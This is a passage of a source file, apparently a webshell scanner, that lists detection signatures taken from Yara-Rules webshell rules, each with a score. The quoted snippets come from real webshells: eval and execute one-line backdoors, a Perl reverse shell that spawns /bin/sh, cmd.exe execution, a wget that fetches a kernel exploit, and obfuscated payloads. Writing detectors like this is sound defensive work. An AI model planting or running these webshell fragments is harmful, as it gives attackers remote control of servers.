    ("Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")", 70),
    (" <% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>", 70),
    ("<small>jsp File Browser version <%= VERSION_NR%> by <a", 70),
    ("<a href= \"<%=Request.ServerVariables(\"script_name\")%>", 70),
    ("Response.Cookies.Add(new HttpCookie(vbhLn,Password));", 70),
    ("q = q & \"&\" & key & \"=\" & request.querystring(key)(j)", 70),
    ("<input type=\"hidden\" name=\"cmd\" value=\"<%=strCmd%>\">", 70),
    ("Response.Output.Write(\"+ Sending {0}<br>\", command);", 70),
    ("//String tempfilename=request.getParameter(\"file\");", 70),
    ("<%@page import=\"java.io.*,java.util.*,java.net.*\"%>", 70),
    ("<INPUT TYPE=\"hidden\" NAME=\"type\" value=\"<%=tipo%>\">", 70),
    ("Set http = Server.CreateObject(\"Microsoft.XMLHTTP\")", 70),
    ("String savePath = request.getParameter(\"savepath\");", 70),
    ("response.write(\"<ERROR: THIS IS NOT A TEXT FILE>\")", 70),
    ("<%@ page contentType=\"text/html;charset=gb2312\"%>", 70),
    ("<form name=frmCMD method=post action=\"<%=gURL%>\">", 70),
    ("Response.Write(\"- Failed to create named pipe:\");", 70),
    ("String downFileUrl = request.getParameter(\"url\");", 70),
    ("String editfile=request.getParameter(\"editfile\");", 70),
    ("String password=request.getParameter(\"password\");", 70),
    ("<%@page contentType=\"text/html;charset=gb2312\"%>", 70),
    ("Response.Write(\"- Error Getting User Info<br>\");", 70),
    ("\"Set WshShell = CreateObject(\"\"WScript.Shell\"\")", 70),
    ("Response.Redirect(\"http://www.rootkit.net.cn\");", 70),
    ("<% For Each Vars In Request.ServerVariables %>", 70),
    ("<%@ import Namespace=\"System.ServiceProcess\"%>", 70),
    ("<%Eval(Request(chr(112))):Set fso=CreateObject", 70),
    ("if (request.getParameter(\"command\") != null) {", 70),
    ("set aktifklas=request.querystring(\"aktifklas\")", 70),
    ("<%@ page language=\"java\" pageEncoding=\"gbk\"%>", 70),
    ("If Request.QueryString(\"CopyFile\") <> \"\" Then", 70),
    ("Response.Write(\"<h3>FILE: \" & file & \"</h3>\")", 70),
    ("Response.Write Drive.ShareName & \" [share]\"", 70),
    ("If request.querystring(\"getDRVs\")=\"@\" then", 70),
    ("request.form(\"cmdOption\")=\"DeleteFolder\"  ", 70),
    ("if request.querystring(\"TGH\") = \"1\" then", 70),
    ("remoteIp = Request.UserHostAddress;", 70),
    ("Dim wshell, intReturn, strPResult", 70),
    ("Response.BinaryWrite(stream.Read)", 70),
    ("Response.Write command & \"<br>\"", 70),
    ("sis = request.getInputStream();", 70),
    ("dim zombie_array,special_array", 70),
    ("if cmdPath=\"wscriptShell\" then", 70),
    ("<% execute request(\"ice\")%>a ", 45),
    ("cmd = Request.Form(\"cmd\")", 45),
    ("<%eval request(\"pass\")%>", 45),
    ("<%eval request(\"ice\")%>", 45),
    (" Then Response.Write \"", 45),
]

# YARA_JSP_SIGS —— 来源: Yara-Rules 社区库 webshells/ (THOR APT Scanner webshell 子集等)
YARA_JSP_SIGS = [
    ("      out.print(\"<tr><td width='60%'>\"+strCut(convertPath(list[i].getPath()),7", 90),
    ("out.print(\") <A Style='Color: \" + fcolor.toString() + \";' HRef='?file=\" + fn", 90),
    ("out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?", 90),
    ("Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));", 90),
    ("if(flist[i].canRead() == true) out.print(\"r\" ); else out.print(\"-\");", 90),
    ("out.println(\"<tr><td>\"+ico(50)+f[i].getName()+\"</td><td> file", 90),
    ("public class JythonShell extends JPanel implements Runnable {", 90),
    ("Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);", 70),
    ("System.out.println(\"CreateAndDeleteFolder is error:\"+ex); ", 70),
    ("if(cmd.equals(\"Szh0ZWFt\")){out.print(\"[S]\"+dir+\"[E]\");}", 70),
]

# YARA_GENERIC_SIGS —— 来源: Yara-Rules 社区库 webshells/ (THOR APT Scanner webshell 子集等)
YARA_GENERIC_SIGS = [
    ("form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\"&HtmlEncode(Server.MapPath(\".\"))&", 90),
    ("var form = jQuery('<form  action=\"\" method=\"POST\" name=\"' + formId + '\" id=\"' + formId + '\" enctype=\"multipart/form-data\"></form>');", 90),
    ("<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)", 90),
    ("<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">", 90),
    ("<form id=\"upload\" name=\"upload\" action=\"ServFMUpload\" method=\"POST\" enctype=\"multipart/form-data\">", 90),
    ("for (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input type=file name=file'+i+'><br>';", 90),
    ("<center>Kernel Info: <form name=\"form1\" method=\"post\" action=\"http://google.com/search\">", 90),
    ("if (!is_readable($o)) {return \"<font color=red>\".view_perms(fileperms($o)).\"</font>\";}", 90),
    ("<form id=\"form\" action=\"ServFMUpload\" method=\"post\" enctype=\"multipart/form-data\">", 90),
    ("If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))", 90),
    ("    <font color=\"#E5E5E5\" style=\"font-size: 8pt; font-weight: 700\" face=\"Arial\">", 90),
    (" \" onClick=\"this.form.sharp.name=this.form.password.value;this.form.action=this.", 90),
    ("#We Are: MasterKid, AleXutz, FatMan & MiKuTuL                                   ", 90),
    ("$GLOBALS['c']($GLOBALS['e'](null, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$_SESSIO", 90),
    ("$img[$id] = \"<img height=\\\"16\\\" width=\\\"16\\\" border=\\\"0\\\" src=\\\"$REMOTE_IMAGE_UR", 90),
    ("%8@#@&P~,P,PP,MV~4BP^~,NS~m~PXc3,_PWbSPU W~~[u3Fffs~/%@#@&~~,PP~~,M!PmS,4S,mBPNB", 90),
    ("(STANDARD_RIGHTS_REQUIRED |SC_MANAGER_CONNECT |SC_MANAGER_CREATE_SERVICE |SC_MAN", 90),
    ("*~PU*&BP[_)f!8c2F*@#@&~,P~P,~P&q~8BPmS~9~~lB~X`V,_,F&*~,jcW~~[_c3TRFFzq@#@&PP,~~", 90),
    (",htaPrewoP(ecalper=htaPrewoP:fI dnE:0=KOtidE:1 - eulaVtni = eulaVtni:nehT 1 => e", 90),
    (".textbox { background: White; border: 1px #000000 solid; color: #000099; font-fa", 90),
    ("// A robust backdoor script made by Daniel Berliner - http://www.qsdconsulting.c", 90),
    ("// a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombi", 90),
    ("//******************************************************************************", 90),
    ("//To keep the changes in the url, when using the 'GET' way to send php variables", 90),
    (";!+/DRknD7+.\\mDrC(V+kcJznndm\\f|nzKuJb'r@!&0KUY@*Jb@#@&Xl\"dKVcJ\\CslU,),@!0KxD~mKV", 90),
    ("<? unlink($filename); unlink($filename1); unlink($filename2); unlink($filename3)", 90),
    ("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?> <assembly xmlns=\"urn:sch", 90),
    ("<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'.", 90),
    ("<body text=\"#008000\" bgcolor=\"#808080\" topmargin=\"0\" leftmargin=\"0\" rightmargin=", 90),
    ("<br />Input&nbsp;URL:&nbsp;&lt;input&nbsp;name=\\\"uploadurl\\\"&nbsp;type=\\\"text\\\"&", 90),
    ("<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value=''", 90),
    ("<input name=\\\"editfilename\\\" type=\\\"text\\\" class=\\\"style1\\\" value='\".$this->inpu", 90),
    ("<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input type=\"r", 90),
    ("<th>Type</th><th>&nbspM&nbsp</th><th>&nbspD&nbsp</th><th>unsigned</th><th>zerofi", 90),
    ("<tr style='background:#242424;' ><td style='padding:10px;'><form action='' encty", 90),
    ("<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><i", 90),
    ("<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input", 90),
    ("?VCreateProcessA@@YGHPBDPADPAU_SECURITY_ATTRIBUTES@@2HKPAX0PAU_STARTUPINFOA@@PAU", 90),
    ("?VFindFirstFileExW@@YGPAXPBGW4_FINDEX_INFO_LEVELS@@PAXW4_FINDEX_SEARCH_OPS@@2K@Z", 90),
    ("Can't uninstall,maybe the backdoor is not installed or,the Password you INPUT is", 90),
    ("ExeNewRs.CommandText = \"UPDATE \" & tablename & \" SET \" & ExeNewRsValues & \" WHER", 90),
    ("FONT-WEIGHT: bold; BACKGROUND: #ffffff url('images/cellpic1.gif'); TEXT-INDENT: ", 90),
    ("FONT-WEIGHT: bold; FONT-SIZE: 10px; BACKGROUND: none transparent scroll repeat 0", 90),
    ("If CheckRecord(\"SELECT COUNT(ID) FROM VictimDetail WHERE VictimID = \" & VictimID", 90),
    ("If ProxyData <> \"\" Then ProxyData = Replace(ProxyData, DATA_SEPERATOR, \"<br />\")", 90),
    ("PADDING-RIGHT: 8px; PADDING-LEFT: 8px; FONT-WEIGHT: bold; FONT-SIZE: 11px; BACKG", 90),
    ("Powerful tool , ftp and cPanel brute forcer , php 5.2.9 safe_mode & open_basedir", 90),
    ("Private Function ConvertBinary(ByVal SourceNumber, ByVal MaxValuePerIndex, ByVal", 90),
    ("ServiceController[] kQmRu=System.ServiceProcess.ServiceController.GetServices();", 90),
    ("You cannot delete protected files/folders! Instead, your attempt has been logged", 90),
    ("\\co!VV2CDtSJ'E*#@#@&mKx/DP14lM/nY{JC81N+6LtbL3^hUWa;M/OE-AXX\"b~/fAs!u&9|J\\grKp\"j", 90),
    ("document.write(unescape('%3C%68%74%6D%6C%3E%3C%62%6F%64%79%3E%3C%53%43%52%49%50%", 90),
    ("erde types','Getallen','Datum en tijd','Tekst','Binaire gegevens','Netwerk','Geo", 90),
    ("href=\"http://www.gimpster.com/wiki/PhpShell\">www.gimpster.com/wiki/PhpShell</a>.", 90),
    ("if( !getRequest(COMMANDS_URL + \"?v=\" + VICTIM + \"&r=\" + generateID(), \"pushComma", 90),
    ("newhtml = '<b>File browser is under construction! Use at your own risk!</b> <br>", 90),
    ("newhtml = '<font size=0><b>This will reload the page... :(</b><br><br><form enct", 90),
    ("now DOS is working at mode %d,faketype %d,against %s,has worked %d minutes,by sp", 90),
    ("open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");", 90),
    ("p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all", 90),
    ("proxyArr = Array (\"HTTP_X_FORWARDED_FOR\",\"HTTP_VIA\",\"HTTP_CACHE_CONTROL\",\"HTTP_F", 90),
    ("theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\")", 90),
    ("void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i", 90),
    ("window.open(\"\"&url&\"?id=edit&path=\"+sfile+\"&op=copy&attrib=\"+attrib+\"&dpath=\"+lp", 90),
    ("www.victime.com/index.php?page=http://emplacement_de_la_backdoor.php , ou en tan", 90),
    ("\" <select name='encode' class='input'><option value=''>ANSI</option><option val", 90),
    ("$dataout .= \"<td><a href='$MyLoc?$SREQ&incdbhost=$myhost&incdbuser=$myuser&incd", 90),
    ("//<img width=1 height=1 src=\"http://websafe.facaiok.com/just7z/sx.asp?u=***.***", 90),
    ("<td>Nerden :<td><input type=\"text\" name=\"nerden\" size=25 value=index.html></td>", 90),
    ("????????????????%><html><head><title>hahahaha</title></head><body bgcolor=\"#fff", 90),
    ("Const strs_toTransform=\"command|Radmin|NTAuThenabled|FilterIp|IISSample|PageCou", 90),
    ("RawCommand = Command & COMMAND_SEPERATOR & Param & COMMAND_SEPERATOR & AttackID", 90),
    ("String sql = \"SELECT * FROM DBA_TABLES WHERE TABLE_NAME not like '%$%' and num_", 90),
    ("cprthtml = \"<font face='arial' size='1'>RHTOOLS 1.5 BETA(PVT) Edited By KingDef", 90),
    ("error_reporting(0);session_start();header(\"Content-type:text/html;charset=utf-8", 90),
    ("function PHPget(){inclVar(); if(confirm(\"O PHPget agora oferece uma lista pront", 90),
    ("if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fname))", 90),
    ("insReader = new InputStreamReader(proc.getInputStream(), Charset.forName(\"GB231", 90),
    ("key = \"5DCADAC1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E53205CA0", 90),
    ("ster\" name=submit> </Font> &nbsp; &nbsp; &nbsp; <a href=mailto:mailbomb@hotmail", 90),
    ("style=\"BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT", 90),
    ("  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>Server Adress:</b", 90),
    ("  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>User Info:</b> ui", 90),
    ("\".htmlspecialchars($file).\" Bu Dosya zaten Goruntuleniyor<kingdefacer@msn.com>", 90),
    ("\".htmlspecialchars($file).\" has been already loaded. PHP Emperor <xb5@hotmail.", 90),
    ("\"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze\"", 90),
    ("\"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo\"", 90),
    ("\"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm\"", 90),
    ("$r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td>", 90),
    ("'*T@*r@#@&mms^PdbYbVuBcAAA==^#~@%><form method=post name=inf><table width=\"75%", 90),
    ("; (choose good passwords!).  Add uses as simple 'username = \"password\"' lines.", 90),
    ("<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#66", 90),
    ("<center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 border", 90),
    ("<input type=button value=Save onclick=\"EditorCommand('Save')\"> <input type=but", 90),
    ("<option value=\"cat /var/cpanel/accounting.log\">/var/cpanel/accounting.log</opt", 90),
    ("<p><font color=red>Wordpress Not Found! <input type=text id=\"wp_pat\"><input ty", 90),
    ("D7nD7l.km4snk`JzKnd{n_ejq;bd{KbPur#kQ8AAA==^#~@%>></td><td><input type=\"submit", 90),
    ("File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName(", 90),
    ("The requested URL /Nemo/shell/zyklonshell.txt was not found on this server.<P>", 90),
    ("function PHPf(){inclVar();var o=prompt(\"[ PHPfilEditor ] by r3v3ng4ns\\nDigite ", 90),
    ("function PHPwriter(){inclVar();var url=prompt(\"[ PHPwriter ] by r3v3ng4ns\\nDig", 90),
    ("href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>", 90),
    ("m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 ", 90),
    ("return DriverManager.getConnection(x[1].trim()+\":\"+x[4],x[2].equalsIgnoreCase(", 90),
    (" else if ($HTTP_POST_VARS['with'] == \"lynx\") { $HTTP_POST_VARS['cmd']= \"lynx ", 90),
    (" fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim", 90),
    (" sbCopy.append(\"<input type=button name=goback value=' \"+strBack[languageNo]+", 90),
    ("\"<p>Current File (import new file name and new file)<br /><input class=\\\"inpu", 90),
    ("'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner o", 90),
    (".println(\"<a href=\\\"javascript:alert('You Are In File Now ! Can Not Pack !');", 90),
    ("<input title=\"Delete all selected files and directories incl. subdirs\" class=", 90),
    ("<input title=\"Upload selected file to the current working directory\" type=\"Su", 90),
    ("Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_bla", 90),
    ("JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</spa", 90),
    ("copy ( $dosya_gonder2, \"$dir/$dosya_gonder2_name\") ? print(\"$dosya_gonder2_na", 90),
    ("die(\"\\nWelcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy\\n", 90),
    ("j \"<Form action='\"&URL&\"?Action2=Post' method='post' name='EditForm'><input n", 90),
    ("print \"\\n\".'<tr><td width=100pt class=linelisting><nobr>POST (php eval)</td><", 90),
    ("    'h' => $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631'),", 90),
    (" <a href=\"http://www.cyberlords.net\" target=\"_blank\">Cyber Lords Community</", 90),
    ("$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&see=$file>$file</a><br>", 90),
    ("$res .= '<td align=\"center\"><a href=\"'.$xshell.'?act=chmod&file='.$_SESSION[", 90),
    ("1HLp1qnlCyl5gko8rDlWHqf8/JoPKvGwEm9Q4nVKvEh0b0PKle3zeFiJNyjxOiVepMSpflJkPv5s", 90),
    ("<a href=\"?act=do\"><font color=\"red\">Go Execute</font></a></b><br /><textarea", 90),
    ("<a href=\"http://www.n-c-c.6x.to\" target=\"_blank\">-->NCC<--</a></center></b><", 90),
    ("<img src=\"http://s43.radikal.ru/i101/1004/d8/ced1f6b2f5a9.png\" align=\"center", 90),
    ("<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'", 90),
    ("<option value=\"\"DROP TABLE [jnc];exec mast\"&kvp&\"er..xp_regwrite 'HKEY_LOCAL", 90),
    ("<p>ConnString : <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssCl", 90),
    ("<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ", 90),
    ("AR8iROET6mMnrqTpC6W1Kp/DsTgxNby9H1xhiswfwgoAtED0y6wEXTihoAtICkIX6L1+vTUYWuWz", 90),
    ("Mode Shell v1.0</font></span></a></font><font face=\"Webdings\" size=\"6\" color", 90),
    ("QQ(cs, z1, z2, sb,z2.indexOf(\"-to:\")!=-1?z2.substring(z2.indexOf(\"-to:\")+4,z", 90),
    ("U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAMUExURf///wAAAJmZzAAAACJoURkAAAAE", 90),
    ("Unix:/bin/sh -c tar vxf xxx.tar Windows:c:\\winnt\\system32\\cmd.exe /c type c:", 90),
    ("bw.write(z2);bw.close();sb.append(\"1\");}else if(Z.equals(\"E\")){EE(z1);sb.app", 90),
    ("else if (fName.endsWith(\".mpg\") || fName.endsWith(\".mpeg\") || fName.endsWith", 90),
    ("fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim", 90),
    ("href=\"/\" title=\"Securityhouse\">Security House - Shell Center - Edited By Kin", 90),
    ("if Int((1-0+1)*Rnd+0)=0 then makeEmail=makeText(8) & \"@\" & makeText(8) & \".\"", 90),
    ("sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strD", 90),
    ("sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDi", 90),
    ("show opened ports</option></select><input type=\"hidden\" name=\"cmd_txt\" value", 90),
    ("  \"c99sh_datapipe.pl\"=>array(\"Using PERL\",\"perl %path %localport %remotehos", 90),
    ("\" href=\"?act=tools\"><font color=#CC0000 size=\"3\">Tools</font></a></span></f", 90),
    ("<LOCAL PORT> <MAPPING SERVER> <MAPPING SERVER PORT> <TARGET SERVER> <TARGET", 90),
    ("<input title=\"Launch command in current directory\" type=\"Submit\" class=\"but", 90),
    ("<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"></head>", 90),
    ("Full server path to a writable file which will contain the Php Shell <br />", 90),
    ("system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o", 90),
    (".'</td><td><a href=\"#\" onclick=\"g(\\'FilesTools\\',null,\\''.urlencode($f['na", 90),
    ("// No eval() calls, no system() calls, nothing normally seen as malicious.", 90),
    ("//Turns the 'ls' command more usefull, showing it as it looks in the shell", 90),
    ("</a><a href='\"&dosyapath&\"?status=10&dPath=\"&f1.path&\"&path=\"&path&\"&Time=", 90),
    ("<font face=\"Verdana\" style=\"font-size: 8pt\" color=\"#800080\">Buradan Dosya ", 90),
    ("<font size='+1'color='#0000FF'><u>CasuS 1.5'in URL'si</u>: http://$HTTP_HO", 90),
    ("<font size='+1'color='#0000FF'>aZRaiLPhP'nin URL'si: http://$HTTP_HOST$RED", 90),
    ("<td colspan=\"2\" width=\"715\" background=\"/simparts/images/cellpic1.gif\" hei", 90),
    ("<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Enter ::</b><for", 90),
    ("SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" O", 90),
    ("Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files", 90),
    ("_url = \"jdbc:microsoft:sqlserver://\" + dbServer + \":\" + dbPort + \";User=\" ", 90),
    ("copy($HTTP_POST_FILES[\"userfile\"][\"tmp_name\"],$HTTP_POST_FILES[\"userfile\"]", 90),
    ("entrika.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreate", 90),
    ("if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fn", 90),
    ("print \"<tr><td><b>Execute command:</b></td><td><input size=100 name=\\\"_cmd", 90),
    ("print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx", 90),
    ("seal.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreateOve", 90),
    ("$buff .= \"<tr><td><a href=\\\"?d=\".$pwd.\"\\\">[ $folder ]</a></td><td>LINK</t", 90),
    ("$headers .= \"\\nMIME-Version: 1.0\\n\" .\"Content-Type: multipart/mixed;\\n\" .", 90),
    ("'/(eval|assert|include|require|include\\_once|require\\_once|array\\_map|arr", 90),
    ("//$message.= \"--{$mime_boundary}\\n\" .\"Content-Type: {$fileatt_type};\\n\" .", 90),
    ("<br><center><INPUT TYPE='SUBMIT' NAME='dy' VALUE='Dosya Yolla!'></center>", 90),
    ("hidden(\"action\",\"download\").hidden_pwd().\"<center><table><tr><td width=80", 90),
    ("print \"<center>[ Generation time: \".round(getTime()-startTime,4).\" second", 90),
    ("    <input name=\"FileName\" type=\"text\" value=\"Asp_ver.Asp\" size=\"20\" max", 90),
    (" if ($mode & 0x200) {$world[\"execute\"] = ($world[\"execute\"] == \"x\")?\"t\":", 90),
    ("\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>", 90),
    ("#$autoErrorTrap Enable automatic error traping if command returns error.", 90),
    ("$_F_F.='_'.$_P_P[5].$_P_P[20].$_P_P[13].$_P_P[2].$_P_P[19].$_P_P[8].$_P_", 90),
    ("<font color=\"#858585\">SHOPEN</font></a></font><font face=\"Verdana\" style", 90),
    ("<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\">", 90),
    ("<table width=\"100%\" border=\"1\" cellspacing=\"0\" cellpadding=\"5\" bordercol", 90),
    ("<td><input size=\"48\" value=\"$docr/\" name=\"path\" type=\"text\"><input type=", 90),
    ("target fi1e:<br><input type=\"text\" name=\"target\" value=\"index.php\"></br>", 90),
    ("\"<p>Current file (fullpath)<br /><input class=\\\"input\\\" name=\\\"file\\\" i", 90),
    ("#########################<<KONEC>>#####################################", 90),
    ("'/\\$\\_(\\w+)(.*)(eval|assert|include|require|include\\_once|require\\_once", 90),
    ("<a class=\"high2\" href=\"javascript:;;;\" name=\"action=show&dir=$_ipage_fi", 90),
    ("<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u", 90),
    ("<font color=\"#858585\">BuqX</font></a></font><font face=\"Verdana\" style=", 90),
    ("<font color=\"blue\">??????????????????:</font><input type=\"text\" size=\"7", 90),
    ("<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />", 90),
    ("<tt>&nbsp;</tt>\" (space), \"<tt>[</tt>\" (left bracket), \"<tt>|</tt>\" (pi", 90),
    ("href=\"mailto: [YOU CAN ENTER YOUR MAIL HERE]- [ADDITIONAL TEXT]</a></i>", 90),
    ("if qpv=\"\" then qpv=\"x:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini\"&br&", 90),
    ("sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ", 90),
    ("string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin", 90),
    ("system(\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\");", 90),
    ("$fqb_log .= \"\\r\\n------------------------------------------\\r\\nDone!\\r", 90),
    ("%s -Run                              -->To Install And Run The Service", 90),
    ("<option value='reg query \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\T", 90),
    ("Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)", 90),
    ("fputs ($fp, \"# RST MySQL tools\\r\\n# Home page: http://rst.void.ru\\r\\n#", 90),
    ("if ($data{0} == \"\\x99\" and $data{1} == \"\\x01\") {return \"Error: \".$stri", 90),
    ("if ((!eregi(\"http://\",$uploadurl)) and (!eregi(\"https://\",$uploadurl))", 90),
    ("ini_set('allow_url_include, 1'); // Allow url inclusion in this script", 90),
    ("private String[] _textFileTypes = {\"txt\", \"htm\", \"html\", \"asp\", \"jsp\",", 90),
    ("theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)", 90),
    ("var flag = \"?txt=\" + (document.getElementById(\"dl\").checked ? \"2\":\"1\" ", 90),
    ("word: \"<tt>null</tt>\", \"<tt>yes</tt>\", \"<tt>no</tt>\", \"<tt>true</tt>\",", 90),
    ("\"\"\"+fontline +\"Version : \" + versionstring + \"\"\", Running on : \"\"\" + ", 90),
    ("<input type=\"text\" name=\"dir\" size=\"30\" value=\"<? passthru(\"pwd\"); ?>", 90),
    ("MorfiCoder=Replace(Replace(StrReverse(Code),\"/*/\",\"\"\"\"),\"\\*\\\",vbCrlf)", 90),
    ("Pos = InstrB(BoundaryPos,RequestBin,getByteString(\"Content-Dispositio", 90),
    ("print(\"<br>Provenance du mail : <input type=\\\"text\\\" name=\\\"provenanc", 90),
    ("register_activation_hook(__FILE__, array('WP_Laudanum', 'activate'));", 90),
    ("  \"c99sh_backconn.pl\"=>array(\"Using PERL\",\"perl %path %host %port\"),", 90),
    ("<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p> ", 90),
    ("<input type=\"hidden\" id=\"fhidden\" name=\"fhidden\" value=\"L3BkZi8=\" />", 90),
    ("<p>kodlama by <a href=\"mailto:priv8coder@gmail.com\">BLaSTER</a><br /", 90),
    ("Create mapped port. You have to specify domain when using HTTP type.", 90),
    ("Dizin</font></b></font><font face=\"Verdana\" style=\"font-size: 8pt\"><", 90),
    ("Welcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy", 90),
    ("byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);", 90),
    ("href='$PHP_SELF?action=dropField&dbname=$dbname&tablename=$tablename", 90),
    ("if($cmd!==''){ echo('<strong>'.htmlspecialchars($cmd).\"</strong><hr>", 90),
    ("table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')", 90),
    ("  \"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control", 90),
    ("' -- Read the output from our command and remove the temp file -- '", 90),
    ("'/(include|require|include\\_once|require\\_once)+\\s*\\(\\s*[\\'|\\\"](\\w+", 90),
    ("'Open ports' => \"runcommand('netstat -an | grep -i listen','GET')\",", 90),
    ("/* We have found the parent dir. We must be carefull if the parent ", 90),
    ("<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>", 90),
    ("if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {", 90),
    ("print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">File: </", 90),
    ("python -c\"import md5;x=md5.new('you_password');print x.hexdigest()\"", 90),
    ("return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;", 90),
    ("\"<form action=\\\"\"+SHELL_NAME+\"?o=upload\\\" method=\\\"POST\\\" enctype=", 90),
    ("\"txt\",\"conf\",\"bat\",\"sh\",\"js\",\"bak\",\"doc\",\"log\",\"sfc\",\"cfg\",\"htacce", 90),
    ("//------- [netstat -an] and [ipconfig] and [tasklist] ------------", 90),
    ("<a style=\"TEXT-DECORATION: none\" href=\"http://www.simorgh-ev.com\">", 90),
    ("<div id=\"bkorotator\"><img alt=\"\" src=\"images/rotator/1.jpg\"></div>", 90),
    ("String fhidden = new String(Base64.encodeBase64(path.getBytes()));", 90),
    ("\\\" name=\\\"upFile\\\" size=\\\"8\\\" class=\\\"textbox\\\" />&nbsp;<input typ", 90),
    ("codeds=\"Li#uhtxhvw+%{{%,#@%{%#wkhq#hydo#uhtxhvw+%knpmm%,#hqg#li\"  ", 90),
    ("fputs ($sockfd ,\"\\n===============================================", 90),
    ("print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">Filenam", 90),
    ("private static class VEditPropertyInvoker extends DefaultInvoker {", 90),
